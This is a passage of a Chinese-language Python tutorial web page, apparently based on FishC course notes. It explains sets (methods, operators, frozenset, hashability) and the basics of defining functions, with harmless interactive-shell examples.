&#x27;C&#x27;: 67&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="13-集合"><a href="#13-集合" class="headerlink" title="13 集合"></a>13 集合</h2><h3 id="13-1-创建集合"><a href="#13-1-创建集合" class="headerlink" title="13.1 创建集合"></a>13.1 创建集合</h3><p>创建一个集合通常有三种方法：</p>
<ul>
<li>使用花括号，元素之间以逗号分隔：{“FishC”, “Python”}</li>
<li>使用集合推导式：{s for s in “FishC”}</li>
<li>使用类型构造器，也就是 set()：set(“FishC”)</li>
</ul>
<h3 id="13-2-集合具有随机性"><a href="#13-2-集合具有随机性" class="headerlink" title="13.2 集合具有随机性"></a>13.2 集合具有随机性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; set(&quot;FishC&quot;)</span><br><span class="line">&#123;&#x27;i&#x27;, &#x27;C&#x27;, &#x27;s&#x27;, &#x27;F&#x27;, &#x27;h&#x27;&#125;</span><br></pre></td></tr></table></figure>
<p>从这里我们不难发现，集合无序的特征，传进去的是 ‘F’、’i’、’s’、’h’、’C’，它这里显示的却是 ‘i’、’C’、’s’、’F’、’h’，在你们的电脑上结果还可能不一样，这就是随机性。<br>由于集合是无序的，所以我们不能使用下标索引的方式去访问它：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = set(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; s[0]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#1&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    s[0]</span><br><span class="line">TypeError: &#x27;set&#x27; object is not subscriptable</span><br></pre></td></tr></table></figure><br>不过我们可以使用 in 和 not in 来判断某个元素是否存在于集合中：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;C&#x27; in s</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#x27;c&#x27; not in s</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<h3 id="13-3-访问集合"><a href="#13-3-访问集合" class="headerlink" title="13.3 访问集合"></a>13.3 访问集合</h3><p>如果想要访问集合中的元素，可以使用迭代的方式：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for each in s:</span><br><span class="line">...     print(each)</span><br><span class="line">...</span><br><span class="line">F</span><br><span class="line">h</span><br><span class="line">i</span><br><span class="line">s</span><br><span class="line">C</span><br></pre></td></tr></table></figure></p>
<h3 id="13-4-集合必杀技-——-去重"><a href="#13-4-集合必杀技-——-去重" class="headerlink" title="13.4 集合必杀技 —— 去重"></a>13.4 集合必杀技 —— 去重</h3><p>集合另外一个特点就是唯一性，小甲鱼本鱼觉得，这也是集合最大的优势。比如利用集合，咱们就可以轻松地实现去重的操作：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; set([1, 1, 2, 3, 5])</span><br><span class="line">&#123;1, 2, 3, 5&#125;</span><br></pre></td></tr></table></figure><br>在实际开发中，我们经常需要去检测一个列表中是否存在相同的元素？<br>那么在没有学习过集合之前，我们很有可能需要通过迭代来统计每个元素出现的次数，从而判断是否唯一……<br>但是，现在，咱们只需要这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 1, 2, 3, 5]</span><br><span class="line">&gt;&gt;&gt; len(s) == len(set(s))</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; s = [1, 2, 3, 5]</span><br><span class="line">&gt;&gt;&gt; len(s) == len(set(s))</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<h3 id="13-5-集合的方法"><a href="#13-5-集合的方法" class="headerlink" title="13.5  集合的方法"></a>13.5  集合的方法</h3><p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-203569-1-1.html">集合的各种方法大合集</a><br>列表、元组、字符串、字典它们都有一个 copy() 方法，那么集合也不例外：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t = s.copy()</span><br><span class="line">&gt;&gt;&gt; t</span><br><span class="line">&#123;&#x27;h&#x27;, &#x27;s&#x27;, &#x27;i&#x27;, &#x27;F&#x27;, &#x27;C&#x27;&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们要检测两个集合之间是否毫不相干，可以使用 isdisjoint(other) 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.isdisjoint(set(&quot;Python&quot;))</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; s.isdisjoint(set(&quot;JAVA&quot;))</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<p>那么这个参数它并不要求必须是集合类型，可以是任何一种可迭代对象：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.isdisjoint(&quot;Python&quot;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; s.isdisjoint(&quot;JAVA&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>下面也是一样的，传入的参数，都只要求是可迭代对象的类型即可。<br>如果我们要检测该集合是否为另一个集合的子集，可以使用 issubset(other) 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.issubset(&quot;FishC.com.cn&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>如果我们要检测该集合是否为另一个集合的超集，可以使用 issuperset(other) 方法（对于两个集合 A、B，如果集合 B 中任意一个元素都是集合 A 中的元素，我们就说这两个集合有包含关系，称集合 A 为集合 B 的超集）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.issuperset(&quot;Fish&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>除了检测子集和超集，我们还可以计算当前集合和其它对象共同构造的并集、交集、差集以及对称差集。<br>并集，就是将集合与其它集合的元素合并在一起，组成一个新的集合：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.union(&#123;1, 2, 3&#125;)</span><br><span class="line">&#123;1, 2, 3, &#x27;h&#x27;, &#x27;s&#x27;, &#x27;i&#x27;, &#x27;F&#x27;, &#x27;C&#x27;&#125;</span><br></pre></td></tr></table></figure><br>交集，就是找到多个集合之间共同的那些元素<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.intersection(&quot;Fish&quot;)</span><br><span class="line">&#123;&#x27;h&#x27;, &#x27;s&#x27;, &#x27;i&#x27;, &#x27;F&#x27;&#125;</span><br></pre></td></tr></table></figure><br>差集，就是找出存在于该集合，但不存在于其它集合中的元素：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.difference(&quot;Fish&quot;)</span><br><span class="line">&#123;&#x27;C&#x27;&#125;</span><br></pre></td></tr></table></figure><br>同时，上面的这三个都是支持多个参数的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.union(&#123;1, 2, 3&#125;, &quot;Python&quot;)</span><br><span class="line">&#123;1, 2, 3, &#x27;y&#x27;, &#x27;h&#x27;, &#x27;n&#x27;, &#x27;i&#x27;, &#x27;P&#x27;, &#x27;s&#x27;, &#x27;o&#x27;, &#x27;t&#x27;, &#x27;C&#x27;, &#x27;F&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; s.intersection(&quot;Php&quot;, &quot;Python&quot;)</span><br><span class="line">&#123;&#x27;h&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; s.difference(&quot;Php&quot;, &quot;Python&quot;)</span><br><span class="line">&#123;&#x27;s&#x27;, &#x27;C&#x27;, &#x27;F&#x27;, &#x27;i&#x27;&#125;</span><br></pre></td></tr></table></figure><br>最后一个是求对称差集，就是排除掉 s 集合和 other 容器中共有的元素后，剩余的所有元素，这个只能支持一个参数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.symmetric_difference(&quot;Python&quot;)</span><br><span class="line">&#123;&#x27;t&#x27;, &#x27;y&#x27;, &#x27;F&#x27;, &#x27;s&#x27;, &#x27;P&#x27;, &#x27;C&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;i&#x27;&#125;</span><br></pre></td></tr></table></figure><br>好了，那么上面这 6 种常见的操作，Python 也提供了相应的运算符，可以直接进行运算。<br>检测子集可以使用小于等于号（&lt;=）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s &lt;= set(&quot;FishC&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>那么检测真子集我们可以使用小于号（&lt;）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s &lt; set(&quot;FishC&quot;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; s &lt; set(&quot;FishC.com.cn&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>那么反过来，使用大于号（&gt;）和大于等于号（&gt;=）就是检测真超集和超集：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s &gt; set(&quot;FishC&quot;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; s &gt;= set(&quot;FishC&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>并集使用管道符（|）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s | &#123;1, 2, 3&#125; | set(&quot;Python&quot;)</span><br><span class="line">&#123;1, 2, 3, &#x27;y&#x27;, &#x27;h&#x27;, &#x27;n&#x27;, &#x27;i&#x27;, &#x27;P&#x27;, &#x27;s&#x27;, &#x27;o&#x27;, &#x27;t&#x27;, &#x27;C&#x27;, &#x27;F&#x27;&#125;</span><br></pre></td></tr></table></figure><br>交集使用 and 符号（&amp;）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s &amp; set(&quot;Php&quot;) &amp; set(&quot;Python&quot;)</span><br><span class="line">&#123;&#x27;h&#x27;&#125;</span><br></pre></td></tr></table></figure><br>差集使用减号（-）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s - set(&quot;Php&quot;) - set(&quot;Python&quot;)</span><br><span class="line">&#123;&#x27;s&#x27;, &#x27;C&#x27;, &#x27;F&#x27;, &#x27;i&#x27;&#125;</span><br></pre></td></tr></table></figure><br>对称差集使用脱字符（^）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s ^ set(&quot;Python&quot;)</span><br><span class="line">&#123;&#x27;t&#x27;, &#x27;y&#x27;, &#x27;F&#x27;, &#x27;s&#x27;, &#x27;P&#x27;, &#x27;C&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;i&#x27;&#125;</span><br></pre></td></tr></table></figure><br>注意：使用运算符的话，符号两边都必须是集合类型的数据才可以，不然会报错。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s &lt;= &quot;FishC&quot;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#46&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    s &lt;= &quot;FishC&quot;</span><br><span class="line">TypeError: &#x27;&lt;=&#x27; not supported between instances of &#x27;set&#x27; and &#x27;str&#x27;</span><br><span class="line">&gt;&gt;&gt; s | [1, 2, 3]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#15&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    s | [1, 2, 3]</span><br><span class="line">TypeError: unsupported operand type(s) for |: &#x27;set&#x27; and &#x27;list&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="13-6-冻结的集合"><a href="#13-6-冻结的集合" class="headerlink" title="13.6 冻结的集合"></a>13.6 冻结的集合</h3><p>Python 将集合细分为可变和不可变两种对象，前者是 set()，后者是 frozenset()：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t = frozenset(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; t</span><br><span class="line">frozenset(&#123;&#x27;s&#x27;, &#x27;C&#x27;, &#x27;i&#x27;, &#x27;F&#x27;, &#x27;h&#x27;&#125;)</span><br></pre></td></tr></table></figure><br>被冻结的集合（frozenset()）是不支持修改的。<br>如果我们尝试修改它，那么可怕的事情就会发生：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t.update([1, 1], &quot;23&quot;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#6&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    t.update([1, 1], &quot;23&quot;)</span><br><span class="line">AttributeError: &#x27;frozenset&#x27; object has no attribute &#x27;update&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="13-7-仅适用于-set-对象的方法"><a href="#13-7-仅适用于-set-对象的方法" class="headerlink" title="13.7 仅适用于 set() 对象的方法"></a>13.7 仅适用于 set() 对象的方法</h3><p><code>update(*others)</code> 方法使用 others 容器中的元素来更新集合：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = set(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;&#x27;s&#x27;, &#x27;C&#x27;, &#x27;i&#x27;, &#x27;F&#x27;, &#x27;h&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; s.update([1, 1], &quot;23&quot;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;&#x27;s&#x27;, 1, &#x27;C&#x27;, &#x27;i&#x27;, &#x27;F&#x27;, &#x27;h&#x27;, &#x27;3&#x27;, &#x27;2&#x27;&#125;</span><br></pre></td></tr></table></figure><br>intersection_update(<em>others)、difference_update(</em>others) 和 symmetric_difference_update(other) 分别是使用前面讲过的交集、差集和对称差集的方式来更新集合：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.intersection_update(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;&#x27;s&#x27;, &#x27;C&#x27;, &#x27;i&#x27;, &#x27;F&#x27;, &#x27;h&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; s.difference_update(&quot;Php&quot;, &quot;Python&quot;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;&#x27;s&#x27;, &#x27;C&#x27;, &#x27;i&#x27;, &#x27;F&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; s.symmetric_difference_update(&quot;Python&quot;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;&#x27;s&#x27;, &#x27;t&#x27;, &#x27;C&#x27;, &#x27;o&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;y&#x27;, &#x27;F&#x27;, &#x27;n&#x27;, &#x27;P&#x27;&#125;</span><br></pre></td></tr></table></figure><br>如果希望要单纯地往集合里添加数据，可以使用 add(elem) 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.add(&quot;45&quot;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;&#x27;s&#x27;, &#x27;t&#x27;, &#x27;C&#x27;, &#x27;o&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;y&#x27;, &#x27;F&#x27;, &#x27;45&#x27;, &#x27;n&#x27;, &#x27;P&#x27;&#125;</span><br></pre></td></tr></table></figure><br>在集合中删除某个元素，可以使用 remove(elem) 或者 discard(elem) 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.remove(&quot;瓦迈&quot;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#15&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    s.remove(&quot;瓦迈&quot;)</span><br><span class="line">KeyError: &#x27;瓦迈&#x27;</span><br><span class="line">&gt;&gt;&gt; s.discard(&quot;瓦迈&quot;)</span><br></pre></td></tr></table></figure></p>
<p>删除还有一个 pop() 方法，用于随机从集合中弹出一个元素：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.pop()</span><br><span class="line">&#x27;s&#x27;</span><br><span class="line">&gt;&gt;&gt; s.pop()</span><br><span class="line">&#x27;t&#x27;</span><br><span class="line">&gt;&gt;&gt; s.pop()</span><br><span class="line">&#x27;C&#x27;</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;&#x27;o&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;y&#x27;, &#x27;F&#x27;, &#x27;45&#x27;, &#x27;n&#x27;, &#x27;P&#x27;&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后，clear() 方法就是将集合清空：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.clear()</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">set()</span><br></pre></td></tr></table></figure>
<h3 id="13-8-可哈希"><a href="#13-8-可哈希" class="headerlink" title="13.8 可哈希"></a>13.8 可哈希</h3><p>想要正确地创建字典和集合，是有一个刚性需求的 —— 那就是字典的键，还有集合的元素，它们都必须是可哈希的。<br>如果一个对象是可哈希的，那么就要求它的哈希值必须在其整个程序的生命周期中都保持不变。<br>通过 hash() 函数，可以轻松获取一个对象的哈希值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hash(1)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; hash(1.0)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; hash(1.001)</span><br><span class="line">2305843009213441</span><br></pre></td></tr></table></figure><br>这个哈希值有什么用呢？<br>对于我们来说可能没啥用，但对于字典和集合来说，却是 “木之根，水之源”，这里我们就不再展开论述了，再深挖下去就有点越俎代庖的感觉了……<br>有兴趣的童鞋可以看看这一篇扩展阅读 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-205214-1-1.html">Python字典的实现原理</a><br>Python 中大多数不可变对象是可哈希的，而那些可变的容器则不哈希<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hash(&quot;FishC&quot;)</span><br><span class="line">2090433017907150752</span><br><span class="line">&gt;&gt;&gt; hash([1, 2, 3])</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#36&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    hash([1, 2, 3])</span><br><span class="line">TypeError: unhashable type: &#x27;list&#x27;</span><br></pre></td></tr></table></figure><br>如果我们把列表换成元组，元组是不可变的对象，那就应该是可哈希的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hash((1, 2, 3))</span><br><span class="line">529344067295497451</span><br></pre></td></tr></table></figure><br>前面我们说了，只有可哈希的对象，才有资格作为字典的键，以及集合的元素：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#123;&quot;Python&quot;:520, &quot;FishC&quot;:1314&#125;</span><br><span class="line">&#123;&#x27;Python&#x27;: 520, &#x27;FishC&#x27;: 1314&#125;</span><br><span class="line">&gt;&gt;&gt; &#123;&quot;Python&quot;, &quot;FishC&quot;, 520, 1314&#125;</span><br><span class="line">&#123;520, 1314, &#x27;Python&#x27;, &#x27;FishC&#x27;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="13-9-嵌套的集合"><a href="#13-9-嵌套的集合" class="headerlink" title="13.9 嵌套的集合"></a>13.9 嵌套的集合</h3><p>如果要实现一个嵌套的集合，可不可行？<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &#123;1, 2, 3&#125;</span><br><span class="line">&gt;&gt;&gt; y = &#123;x, 4, 5&#125;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#39&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    y = &#123;x, 4, 5&#125;</span><br><span class="line">TypeError: unhashable type: &#x27;set&#x27;</span><br></pre></td></tr></table></figure><br>这样写是不行的，因为集合它是一个可变的容器，而可变的容器则是不可哈希。<br>那我们非要将集合嵌套，还有没有办法？<br>有！<br>没错，使用 “冰山美人” <code>frozenset()</code> 对象<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = frozenset(x)</span><br><span class="line">&gt;&gt;&gt; y = &#123;x, 4, 5&#125;</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line">&#123;frozenset(&#123;1, 2, 3&#125;), 4, 5&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="14-函数"><a href="#14-函数" class="headerlink" title="14 函数"></a>14 函数</h2><p>Python 函数的主要作用就是打包代码。</p>
<p>有两个显著的好处：</p>
<p>可以最大程度地实现代码重用，减少冗余的代码<br>可以将不同功能的代码段进行封装、分解，从而降低结构的复杂度，提高代码的可读性。</p>
<h3 id="14-1-创建和调用函数"><a href="#14-1-创建和调用函数" class="headerlink" title="14.1 创建和调用函数"></a>14.1 创建和调用函数</h3><p>我们使用 def 语句来定义函数，紧跟着的是函数的名字，后面带一对小括号，冒号下面就是函数体，函数体是一个代码块，也就是每次调用函数时将被执行的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc():</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>注：pass 是一个空语句，表示不做任何事情，经常是被用来做一个占位符使用的。调用这个函数，只需要在名字后面加上一对小括号：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; myfunc()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="14-3-函数的参数"><a href="#14-3-函数的参数" class="headerlink" title="14.3 函数的参数"></a>14.3 函数的参数</h3><p>从调用角度来看，参数可以细分为：形式参数（parameter）和实际参数（argument）。<br>其中，形式参数是函数定义的时候写的参数名字（比如下面例子中的 name 和 times）；实际参数是在调用函数的时候传递进去的值（比如下面例子中的 “Python” 和 5）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc(name, times):</span><br><span class="line">...     for i in range(times):</span><br><span class="line">...         print(f&quot;I love &#123;name&#125;.&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; myfunc(&quot;Python&quot;, 5)</span><br><span class="line">I love Python.</span><br><span class="line">I love Python.</span><br><span class="line">I love Python.</span><br><span class="line">I love Python.</span><br><span class="line">I love Python.</span><br></pre></td></tr></table></figure>
<h3 id="14-4-函数的返回值"><a href="#14-4-函数的返回值" class="headerlink" title="14.4 函数的返回值"></a>14.4 函数的返回值</h3><p>有时候，我们可能需要函数干完活之后能给一个反馈，这在 BIF 函数中也很常见，比如 sum() 函数会返回求和后的结果，len() 函数会返回一个元素的长度，而 list() 函数则会将参数转换为列表后返回……<br>只需要使用 return 语句，就可以让咱们自己定制的函数实现返回：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def div(x, y):</span><br><span class="line">...     z = x / y</span><br><span class="line">...     return z</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; div(4, 2)</span><br><span class="line">2.0</span><br></pre></td></tr></table></figure><br>最后，如果一个函数没有通过 return 语句返回，它也会自己在执行完函数体中的语句之后，悄悄地返回一个 None 值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc():</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; print(myfunc())</span><br><span class="line">None</span><br></pre></td></tr></table></figure></p>
